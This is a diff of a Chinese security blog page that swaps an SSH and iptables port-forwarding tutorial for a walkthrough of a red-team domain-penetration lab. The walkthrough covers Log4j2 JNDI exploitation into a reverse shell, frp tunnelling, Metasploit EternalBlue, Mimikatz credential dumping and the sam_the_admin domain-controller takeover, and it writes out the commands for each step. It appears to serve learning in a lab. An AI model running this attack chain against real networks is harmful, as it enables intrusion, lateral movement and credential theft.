@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>SSH转发和iptables端口转发 | colind0pe&#39;s blog</title>
-  <meta name="keywords" content=" 端口转发 ">
-  <meta name="description" content="SSH转发和iptables端口转发 | colind0pe&#39;s blog">
+  <title>渗透攻击红队域渗透靶场-2(redteam.lab)Writeup | colind0pe&#39;s blog</title>
+  <meta name="keywords" content=" 域渗透 ">
+  <meta name="description" content="渗透攻击红队域渗透靶场-2(redteam.lab)Writeup | colind0pe&#39;s blog">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="个人简介colind0pe, 网络空间安全专业本科在读，目前从事安全方面的实习工作 联系我WeChat：hl_lhcq 邮箱：&amp;#49;&amp;#x33;&amp;#55;&amp;#x30;&amp;#50;&amp;#x32;&amp;#55;&amp;#x39;&amp;#x39;&amp;#54;&amp;#x40;&amp;#113;&amp;#x71;&amp;#46;&amp;#x63;&amp;#111;&amp;#x6d;">
 <meta property="og:type" content="website">
@@ -358,9 +358,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-SSH转发和iptables端口转发" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-渗透攻击红队域渗透靶场-2-redteam-lab-Writeup" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">SSH转发和iptables端口转发</h1>
+        <h1 class="article-title">渗透攻击红队域渗透靶场-2(redteam.lab)Writeup</h1>
     
     <div class="article-meta">
         
@@ -370,7 +370,7 @@
             <i class="iconfont icon-category"></i>
             
             
-            <a  data-rel="内网渗透">内网渗透</a>
+            <a  data-rel="渗透测试">渗透测试</a>
             
         </span>
         
@@ -378,19 +378,19 @@
         <span class="tag">
             <i class="iconfont icon-tag"></i>
             
-            <a class="color5">端口转发</a>
+            <a class="color4">域渗透</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-            发布时间 : <time class="date" title='最后更新: 2021-12-25 20:19:50'>2021-12-02 14:54</time>
+            发布时间 : <time class="date" title='最后更新: 2021-12-25 20:27:56'>2021-12-25 20:25</time>
         
     </div>
     <div class="article-meta">
         
-        <span>字数:1.1k</span>
+        <span>字数:1k</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -420,7 +420,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#SSH%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E7%AE%80%E4%BB%8B"><span class="toc-text">SSH端口转发简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSH%E6%9C%AC%E5%9C%B0SOCKS5%E4%BB%A3%E7%90%86"><span class="toc-text">SSH本地SOCKS5代理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSH%E6%9C%AC%E5%9C%B0%E8%BD%AC%E5%8F%91"><span class="toc-text">SSH本地转发</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSH%E8%BF%9C%E7%A8%8B%E8%BD%AC%E5%8F%91"><span class="toc-text">SSH远程转发</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#iptables%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-text">iptables端口转发</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E9%85%8D%E7%BD%AE"><span class="toc-text">基础配置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-text">本地端口转发</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-text">远程端口转发</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A0%E9%99%A4%E8%AF%A5%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-text">删除该端口转发</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0"><span class="toc-text">漏洞发现</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2021-44228%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">CVE-2021-44228漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">内网信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F"><span class="toc-text">内网横向渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#frp%E6%B5%81%E9%87%8F%E8%BD%AC%E5%8F%91"><span class="toc-text">frp流量转发</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSF%E8%AE%BE%E7%BD%AESocks-%E4%BB%A3%E7%90%86"><span class="toc-text">MSF设置Socks 代理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MS17-010-%E6%BC%8F%E6%B4%9E%E6%8E%A2%E6%B5%8B%E4%B8%8E%E5%88%A9%E7%94%A8"><span class="toc-text">MS17-010 漏洞探测与利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%9F%E6%B8%97%E9%80%8F"><span class="toc-text">域渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">域内信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSF%E6%B5%81%E9%87%8F%E8%BD%AC%E5%8F%91"><span class="toc-text">MSF流量转发</span></a></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -436,103 +436,131 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="SSH端口转发简介"><a href="#SSH端口转发简介" class="headerlink" title="SSH端口转发简介"></a>SSH端口转发简介</h2><p>SSH会自动加密和解密所有SSH客户端与服务端之间的网络数据。SSH还能够将其他TCP端口的网络数据通过SSH链接来转发，并且自动提供了相应的加密及解密服务。这一过程也被叫做”<strong>隧道</strong>“（tunneling），这是因为SSH为其他TCP链接提供了一个安全的通道来进行传输而得名。例如，Telnet ，SMTP ，LDAP这些TCP应用均能够从中得益，避免了用户名，密码以及隐私信息的明文传输。而与此同时，如果工作环境许中的防火墙限制了一些网络端口的使用，但是允许SSH的连接，也能够将通过将TCP用端口转发来使用SSH进行通讯。</p>
-<p><strong>SSH端口转发的两大功能</strong>：</p>
-<ul>
-<li>加密SSH Client端至SSH Server端之间的通讯数据。</li>
-<li>突破防火墙的简直完成一些之前无法建立的TCP连接。</li>
-</ul>
-<h2 id="SSH本地SOCKS5代理"><a href="#SSH本地SOCKS5代理" class="headerlink" title="SSH本地SOCKS5代理"></a>SSH本地SOCKS5代理</h2><pre><code>ssh -qTfnN -D 7777 username@remotehost
+        <pre><code>知识点：log4j2 RCE、CVE-2021-42287、CVE-2021-42278、MS17-010漏洞利用、frp内网穿透、MSF搭建socks代理
 </code></pre>
-<pre><code>参数说明：
--C  压缩数据
--q  安静模式
--T  禁止远程分配终端
--n  关闭标准输入
--N  不执行远程命令
--f  ssh后台运行
--D  本地的端口
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本次靶场是 <strong>渗透攻击红队</strong> 出的第二个内网域渗透靶场，里面包含了最新出的漏洞：Log4j2 RCE、CVE-2021-42287、CVE-2021-42278，下面是本次靶场的拓扑图：</p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/Fyn0LDquNlSficHgYbBFsRkBc6ddvrkDClB1Via7X4oqBtvEot920tZDdQdUiciaDpeZn0OcwMj8r3dOucu4Z9ecQA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1"></p>
+<p>PS：靶场下载地址关注微信公众号：<strong>红队攻防实验室</strong> 回复：<strong>001</strong> 即可获取到下载地址。</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><pre><code>Ubuntu Desktop ip：192.168.124.8（模拟服务器公网ip）
+Kali ip：192.168.124.7
 </code></pre>
-<p><img src="https://i.loli.net/2021/12/02/v4W65cV3yq9xikr.png"></p>
-<p>浏览器开启代理：</p>
-<p><img src="https://i.loli.net/2021/12/02/bUxjd9nwPiaOGeJ.png"></p>
-<p>IP地址已经发生变化：</p>
-<p><img src="https://i.loli.net/2021/12/02/UX8ovdIgrj1ZaTp.png"></p>
-<h2 id="SSH本地转发"><a href="#SSH本地转发" class="headerlink" title="SSH本地转发"></a>SSH本地转发</h2><p><strong>场景：</strong></p>
-<ol>
-<li>本机能与中间服务器互通</li>
-<li>中间服务器能与目标机器互通，中间服务器已拿到目标机器权限</li>
-<li>本地不能直接访问目标机器</li>
-<li>目标机器不出网</li>
-<li>目的：本机能访问目标机器</li>
-</ol>
-<p><strong>命令：</strong></p>
-<pre><code>ssh -L localport:targethost:targetport username@sshserver
+<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><pre><code>nmap -sC -sV -p- 192.168.124.8
 </code></pre>
-<pre><code>localport       本机开启的端口
-targethost      目标机器的IP地址
-targetport      目标机器的端口
-username        中间服务器的用户名
-sshserver       中间服务器的IP地址
+<p><img src="https://s2.loli.net/2021/12/25/isQdo7n8YMO63zr.png"></p>
+<p>一台Ubuntu机器，开放了两个端口<code>22</code>、<code>38080</code></p>
+<h3 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h3><p><code>22</code>端口暂时无法利用，先访问<code>38080</code>端口</p>
+<p><img src="https://s2.loli.net/2021/12/25/P8aAskWUO9GMgin.png"></p>
+<p>是一个web服务，直接尝试最近爆出的<code>CVE-2021-44228</code>Log4j2 rce漏洞，看看能不能获取到 <code>dnslog</code></p>
+<p><img src="https://s2.loli.net/2021/12/25/rahfqH8YAns4bOX.png"></p>
+<p>发现存在<code>CVE-2021-44228</code>log4j2 rce漏洞。接下来利用该漏洞反弹shell</p>
+<h2 id="CVE-2021-44228漏洞利用"><a href="#CVE-2021-44228漏洞利用" class="headerlink" title="CVE-2021-44228漏洞利用"></a>CVE-2021-44228漏洞利用</h2><p>使用<a target="_blank" rel="noopener" href="https://github.com/feihong-cs/JNDIExploit">工具</a>在<strong>Kali</strong>终端（192.168.124.7）开启一个LDAP：</p>
+<p><img src="https://s2.loli.net/2021/12/25/Lx32deqBcDFZNjE.png"></p>
+<p>并开启一个监听端口，来接收反弹的shell</p>
+<pre><code>nc -lnvp 4444
 </code></pre>
-<p><strong>结果：</strong></p>
-<p>此时，在在本机访问localport就可以访问目标主机的targetport了</p>
-<h2 id="SSH远程转发"><a href="#SSH远程转发" class="headerlink" title="SSH远程转发"></a>SSH远程转发</h2><p>反向连接的一种，可以穿透内网防火墙，在内网中比较好用</p>
-<pre><code>ssh -R sshserverport:targethost:targetport username@sshserver
+<p><img src="https://s2.loli.net/2021/12/25/8YgNSkslQJOzM7u.png"></p>
+<p>使用EXP成功反弹shell</p>
+<p><img src="https://s2.loli.net/2021/12/25/V4vcumZy7A1CaSh.png"></p>
+<p>当前的shell是一个Docker环境</p>
+<p><img src="https://s2.loli.net/2021/12/25/KTxhpcBFZdftOwo.png"></p>
+<p><img src="https://s2.loli.net/2021/12/25/rEHbGacJxSXnMIk.png"></p>
+<p>在<code>/root/    </code>目录下找到了flag，给出了一个账号密码，应该是端口扫描时发现开放的<code>SSH</code>的账号密码</p>
+<p><img src="https://s2.loli.net/2021/12/25/h2ud3zKTJoUebL9.png"></p>
+<h2 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h2><p>使用获得的账号密码成功登录<code>SSH</code>服务</p>
+<p><img src="https://s2.loli.net/2021/12/25/4dqi6MFtcluaoJN.png"></p>
+<p><code>ifconfig</code>发现该机器有双网卡，其中 <code>ens33</code> 是外网的网卡，<code>ens38</code> （10.0.1.6）是内网网卡</p>
+<p><img src="https://s2.loli.net/2021/12/25/p2shzE5quwoUyYQ.png"></p>
+<p>我们用 <code>for</code> 循环 <code>ping</code> 一下 <code>ens38</code> 的 <code>C</code> 段：</p>
+<pre><code>for i in 10.0.1.&#123;1..254&#125;; do if ping -c 3 -w 3 $i &amp;&gt;/dev/null; then echo $i Find the target; fi; done
 </code></pre>
-<pre><code>sshserverpor        中间服务器的端口号
-targethost          目标机器的IP地址
-targetport          目标机器的端口
-username            中间服务器的用户名
-sshserver           中间服务器的IP地址
+<p>发现有一台存活主机<code>10.0.1.7</code></p>
+<p><img src="https://s2.loli.net/2021/12/25/hYRtSfk19maZHLC.png"></p>
+<h2 id="内网横向渗透"><a href="#内网横向渗透" class="headerlink" title="内网横向渗透"></a>内网横向渗透</h2><h3 id="frp流量转发"><a href="#frp流量转发" class="headerlink" title="frp流量转发"></a>frp流量转发</h3><p>使用<a target="_blank" rel="noopener" href="https://github.com/fatedier/frp"><strong>frp</strong></a>将已获取到权限的<code>Ubuntu</code>的流量代理出来，这样就可以通过<code>Kali</code>来对内网存活主机进行渗透了</p>
+<p>我们先要将<code>frp</code>上传到<code>Ubuntu</code>中，在<code>Kali</code>开启一个<code>HTTP</code>服务</p>
+<pre><code>python3 -m http.server 80
 </code></pre>
-<p><strong>开启远程需要更改配置</strong></p>
-<pre><code>sudo vim /etc/ssh/sshd_config    
-#任何人访问这台机器的某一个端口，都可以访问到目标机的映射出的端口；这个需要在中间服务器上开启
-GatewayPorts    yes
+<p><img src="https://s2.loli.net/2021/12/25/5isFM4qrH1UEnYv.png"></p>
+<p>然后在<code>Ubuntu</code>中下载</p>
+<p><img src="https://s2.loli.net/2021/12/25/aG3SCVZQzI7q2Ru.png"></p>
+<p>在<code>Ubuntu</code>中给予<code>frp.tar.gz</code>执行权限，并解压</p>
+<pre><code>chmod +x frp.tar.gz
+tar -zxvf frp.tar.gz
 </code></pre>
-<pre><code>sudo /etc/ssh/sshd_config restart   #重启SSH
+<p><img src="https://s2.loli.net/2021/12/25/Sl1c4gfoekZ8shP.png"></p>
+<p>进入<code>frp</code>目录，配置好<code>frpc.ini</code></p>
+<p><img src="https://s2.loli.net/2021/12/25/y9CkpEQPce3hdXv.png"></p>
+<p>然后回到<code>Kali</code>终端开启<code>frp</code>的服务端</p>
+<p><img src="https://s2.loli.net/2021/12/25/3EN1aGQRTntbqWx.png"></p>
+<p>再在<code>Ubuntu</code>中启动客户端</p>
+<p><img src="https://s2.loli.net/2021/12/25/MoNUh7RAvKOrGg1.png"></p>
+<p>此时<code>Kali</code>的服务端就有响应了</p>
+<p><img src="https://s2.loli.net/2021/12/25/hZ8RaToDQHGbutX.png"></p>
+<h3 id="MSF设置Socks-代理"><a href="#MSF设置Socks-代理" class="headerlink" title="MSF设置Socks 代理"></a>MSF设置Socks 代理</h3><pre><code>setg Proxies socks5:192.168.124.7:7777
+setg ReverseAllowProxy true
 </code></pre>
-<p><strong>因为是反向连接，所以肯定需要在目标机器上执行命令</strong></p>
-<p>在目标机器上执行命令：</p>
-<pre><code>ssh -R 8899:10.10.10.132:80 test@10.10.10.135 
-#把目标机的80端口转发到10.10.10.135(中间服务器)上的8899端口
+<p><img src="https://s2.loli.net/2021/12/25/RNX9WnoepZrf3wu.png"></p>
+<p>使用 <code>smb</code> 版本探测模块对目标进行扫描：</p>
+<pre><code>use auxiliary/scanner/smb/smb_version
+set rhosts 10.0.1.7
 </code></pre>
-<p>现在任何机器，只要访问10.10.10.13这台中间服务器的8899端口，就相当于访问了不出网的内网10.10.10.132机器的80端口</p>
-<h2 id="iptables端口转发"><a href="#iptables端口转发" class="headerlink" title="iptables端口转发"></a>iptables端口转发</h2><h3 id="基础配置"><a href="#基础配置" class="headerlink" title="基础配置"></a>基础配置</h3><ol>
-<li><p>修改内核文件实现端口转发</p>
-<p><strong>方法1：</strong></p>
-</li>
-</ol>
-<pre><code>1.编辑sysctl配置文件 vim /etc/sysctl.conf
-2.开启ipv4 forward
+<p><img src="https://s2.loli.net/2021/12/25/JuiYcMgrLHnzGqw.png"></p>
+<p>发现目标 <code>10.0.1.7</code>系统 版本是 <code>Windows 7</code>，且存在域 <code>REDTEAM</code></p>
+<p>接着探测目标是否存在经典的<code>MS17-010</code>漏洞</p>
+<h3 id="MS17-010-漏洞探测与利用"><a href="#MS17-010-漏洞探测与利用" class="headerlink" title="MS17-010 漏洞探测与利用"></a>MS17-010 漏洞探测与利用</h3><pre><code>use auxiliary/scanner/smb/smb_ms17_010
+set rhosts 10.0.1.7
 </code></pre>
-<p>​        <strong>方法2</strong>： 直接sysctl修改</p>
-<pre><code>使用sysctl -w net.ipv4.ip_forward=1
-然后查看sysctl -p和之前修改的一样。
+<p><img src="https://s2.loli.net/2021/12/25/Mx7V4XuLn9gImwy.png"></p>
+<p>目标主机<code>win7</code>确实存在<code>永恒之蓝</code>漏洞</p>
+<p>接下来我们继续使用<code>MSF</code>的模块进行漏洞利用，由于目标机器不一定出网，我们选择用正向连接的<code>payload</code></p>
+<pre><code>use windows/smb/ms17_010_eternalblue
+set payload windows/x64/meterpreter/bind_tcp
+set rhosts 10.0.1.7
+run
 </code></pre>
-<h3 id="本地端口转发"><a href="#本地端口转发" class="headerlink" title="本地端口转发"></a>本地端口转发</h3><p>REDIRECT模式是防火墙所在的机子内部转发包或流到另一个端口，也就是所有接收的包只转发给本地端口。</p>
-<p>将本机的 7777 端口转发到 6666 端口：</p>
-<pre><code>iptables -t nat -A PREROUTING -p tcp --dport 7777 -j REDIRECT --to-port 6666
+<img src="https://s2.loli.net/2021/12/25/wMnTPC3NlLJ9AgK.png" style="zoom: 80%;" />
+
+<p>成功获得一个<code>meterpreter</code></p>
+<p><img src="https://s2.loli.net/2021/12/25/jDzbevUSNAP1LVu.png"></p>
+<p>拿到 <code>Win7</code> 权限后加载 <code>Mimikatz</code> 抓取明文密码</p>
+<pre><code>load mimikatz
+creds_all
 </code></pre>
-<h3 id="远程端口转发"><a href="#远程端口转发" class="headerlink" title="远程端口转发"></a>远程端口转发</h3><p>通过 1.168 的 6666 端口访问 1.8 的 7777 端口，在 1.168 上设置：</p>
-<pre><code>sysctl -w net.ipv4.ip_forward=1
-iptables -t nat -A PREROUTING -p tcp --dport 6666 -j DNAT --to-destination 192.168.1.8:7777
-iptables -t nat -A POSTROUTING -p tcp -d 192.168.1.8 --dport 7777 -j SNAT --to-source 192.168.1.168
+<p><img src="https://s2.loli.net/2021/12/25/K7d4GxDLbOzhECN.png"></p>
+<p>此时我们得到了一个域用户的账号密码</p>
+<h2 id="域渗透"><a href="#域渗透" class="headerlink" title="域渗透"></a>域渗透</h2><h3 id="域内信息收集"><a href="#域内信息收集" class="headerlink" title="域内信息收集"></a>域内信息收集</h3><pre><code>hostname
+net user /domain
+ipconfig
 </code></pre>
-<h3 id="删除该端口转发"><a href="#删除该端口转发" class="headerlink" title="删除该端口转发"></a>删除该端口转发</h3><p>查看当前iptables 的 nat 表的所有规则：（不用 -t 指定表名默认的是指 filter 表）</p>
-<pre><code>iptables -t nat -nL --line
+<p><img src="https://s2.loli.net/2021/12/25/wLe1nTbmszfFRSu.png"></p>
+<p><img src="https://s2.loli.net/2021/12/25/P4INuV6HBbDZhaR.png"></p>
+<p>发现<code>win7</code>还有一个内网网卡，接着我们需要定位域控</p>
+<pre><code>net group &quot;Domain Controllers&quot; /domain
+ping DC
 </code></pre>
-<p>删除指定表的指定链上的规则， -D 并指定序号即可。</p>
-<pre><code>iptables -t nat -D PREROUTING 1
+<p><img src="https://s2.loli.net/2021/12/25/grtlYL3HQ4JcWwU.png"></p>
+<p>定位到域控到域控 <code>IP</code> 为 <code>10.0.0.12</code> ，接下来直接尝试最近爆出的两个域内核武器漏洞：CVE-2021-42287、CVE-2021-42278</p>
+<p><strong>具体：</strong><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzkzNzMxNDc5Mg==&mid=2247483681&idx=1&sn=5757667e1a2f812244fe17b50ce46c27&chksm=c29011a6f5e798b089099860b7754babafd39154911a64a53669da882df6dec5118cf7942414&scene=21#wechat_redirect">只需要一个域用户即可拿到 DC 权限（CVE-2021-42287 and CVE-2021-42278）</a></p>
+<h3 id="MSF流量转发"><a href="#MSF流量转发" class="headerlink" title="MSF流量转发"></a>MSF流量转发</h3><p>我们先将<code>win7</code>的流量代理出来，然后在<code>Kali</code>中实现域内提权</p>
+<p>先添加路由：</p>
+<pre><code>run autoroute -s 10.0.0.7/24
 </code></pre>
-<blockquote>
-<p>参考：</p>
-<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/tri1ruKqc-YztdWC-JmznA">SSH代理转发</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/keerya/p/7612715.html">SSH端口转发详解及实例</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/289254.html">一文带你了解iptables用法及端口转发</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/zhouguoqionghai/article/details/81947603">iptables 端口转发</a></p>
-</blockquote>
+<p><img src="https://s2.loli.net/2021/12/25/rQkhlwGEZcsm9zK.png"></p>
+<p>使用 MSF 添加了一个 Socks：</p>
+<pre><code>background
+use auxiliary/server/socks_proxy
+run
+</code></pre>
+<p><img src="https://s2.loli.net/2021/12/25/GHaZPjcoNR8Dwnu.png"></p>
+<p>接着修改<code>proxychain</code>配置文件</p>
+<pre><code>vim /etc/proxychains4.conf
+</code></pre>
+<p><img src="https://s2.loli.net/2021/12/25/nkmBMlRVItbWEsh.png"></p>
+<p>直接使用<a target="_blank" rel="noopener" href="https://github.com/WazeHell/sam-the-admin">脚本</a>利用漏洞进行域内提权</p>
+<pre><code>proxychains python3 sam_the_admin.py &quot;redteam/root:Red12345&quot; -dc-ip 10.0.0.12 -shell
+</code></pre>
+<p><img src="https://s2.loli.net/2021/12/25/sojU6f8SKgOC7vb.png"></p>
+<p>最后拿到最终的flag</p>
+<p><img src="https://s2.loli.net/2021/12/25/TktQN23dHpwsiJh.png"></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 1370227996@qq.com </span>
